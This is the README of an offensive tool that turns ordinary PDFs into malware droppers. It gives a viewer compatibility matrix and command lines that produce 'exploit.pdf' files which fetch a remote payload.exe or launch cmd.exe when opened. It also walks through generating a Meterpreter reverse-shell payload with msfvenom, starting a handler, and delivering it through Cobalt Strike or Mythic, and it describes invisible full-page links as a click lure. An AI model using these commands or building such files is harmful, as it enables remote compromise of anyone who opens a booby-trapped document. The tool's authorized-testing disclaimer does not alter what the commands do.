# PDF Dropper

A Python tool for injecting JavaScript/Actions into PDF files for security research and Red Team exercises.

## ⚠️ Disclaimer

**This tool is intended for authorized security testing and research purposes only.**

- Only use on systems you own or have explicit written permission to test
- Unauthorized use against systems you don't own is illegal
- The authors are not responsible for misuse of this tool

## Features

- **Multiple exploitation modes:**

  - `adobe` - JavaScript `app.launchURL()` (Adobe Acrobat only)
  - `uri` - URI OpenAction (more compatible)
  - `launch` - Execute commands (Adobe/Foxit with prompt)
  - `submit` - SubmitForm action
  - `multi` - All techniques combined (recommended)

- **Cross-platform payload server** with OS detection
- **Full-page clickable links** as fallback for browser PDF viewers

## Compatibility Matrix

| Viewer          | JS  | URI | Launch | Click Link |
| --------------- | :-: | :-: | :----: | :--------: |
| Adobe Acrobat   | ✅  | ✅  |   ✅   |     ✅     |
| Foxit Reader    | ⚠️  | ✅  |   ⚠️   |     ✅     |
| Chrome/Edge PDF | ❌  | ❌  |   ❌   |     ✅     |
| Firefox PDF     | ❌  | ❌  |   ❌   |     ✅     |
| Linux viewers   | ❌  | ❌  |   ❌   |     ✅     |

✅ = Works | ⚠️ = Prompts user | ❌ = Blocked

## Installation

```bash
cd pdf_dropper

# Create virtual environment (optional but recommended)
python -m venv .venv

# Activate virtual environment
# Windows:
.venv\Scripts\activate
# Linux/macOS:
source .venv/bin/activate

# Install dependencies
pip install -r requirements.txt
```

## Usage

### Basic Usage

```bash
# Multi-mode (recommended - combines all techniques)
python main.py -f original.pdf -o exploit.pdf -u "http://YOUR_SERVER/payload.exe" -m multi

# Adobe-only mode
python main.py -f original.pdf -o exploit.pdf -u "http://YOUR_SERVER/payload.exe" -m adobe

# URI mode
python main.py -f original.pdf -o exploit.pdf -u "http://YOUR_SERVER/payload.exe" -m uri

# Launch mode (execute command)
python main.py -f original.pdf -o exploit.pdf -c "cmd.exe" -m launch
```

### Command Line Options

| Option           | Description                                                    |
| ---------------- | -------------------------------------------------------------- |
| `-f, --file`     | Path to the original PDF file (required)                       |
| `-o, --output`   | Path for the output PDF file (required)                        |
| `-u, --url`      | URL to launch when PDF is opened                               |
| `-c, --command`  | Command to execute (for 'launch' mode)                         |
| `-p, --password` | Password if the PDF is encrypted                               |
| `-m, --mode`     | Exploitation mode: `adobe`, `uri`, `launch`, `submit`, `multi` |

### Payload Server (Optional)

The included payload server can detect the victim's OS and serve the appropriate payload:

```bash
# Edit payload_server.py to configure your payload paths
python payload_server.py 8080
```

## Integration with C2 Frameworks

### Metasploit

```bash
# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=YOUR_IP LPORT=443 -f exe -o payload.exe

# Start listener
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST YOUR_IP; set LPORT 443; exploit"

# Host payload
python -m http.server 8080

# Create PDF dropper
python main.py -f document.pdf -o exploit.pdf -u "http://YOUR_IP:8080/payload.exe" -m multi
```

### Cobalt Strike

```
# In Cobalt Strike: Attacks → Web Drive-by → Scripted Web Delivery
# Copy the generated URL

# Create PDF dropper
python main.py -f document.pdf -o exploit.pdf -u "http://TEAMSERVER/a" -m multi
```

### Mythic

```bash
# Generate Apollo/Athena payload in Mythic UI
# Host the payload or use Mythic's file hosting

# Create PDF dropper
python main.py -f document.pdf -o exploit.pdf -u "https://MYTHIC_SERVER/file/download/XXXXX" -m multi
```

## Project Structure

```
pdf_dropper/
├── core/
│   ├── __init__.py    # PDF wrapper class
│   └── imp.py         # PyPDF2 imports
├── adobecodeinject.py # Exploitation classes
├── main.py            # CLI entry point
├── payload_server.py  # Cross-platform payload server
├── requirements.txt   # Dependencies
├── LICENSE            # MIT License
└── README.md
```

## How It Works

1. **JavaScript OpenAction**: Injects JavaScript that calls `app.launchURL()` when the PDF is opened in Adobe Acrobat
2. **URI OpenAction**: Adds a URI action that triggers on document open
3. **Full-page Link Annotations**: Creates invisible clickable links covering each page as a fallback

## References

- [Original research by 0x6rss](https://cti.monster/blog/2024/07/25/pdfdropper.html)
- [PDF Reference Manual](https://opensource.adobe.com/dc-acrobat-sdk-docs/pdfstandards/PDF32000_2008.pdf)

## License

MIT License - See [LICENSE](LICENSE) file for details.
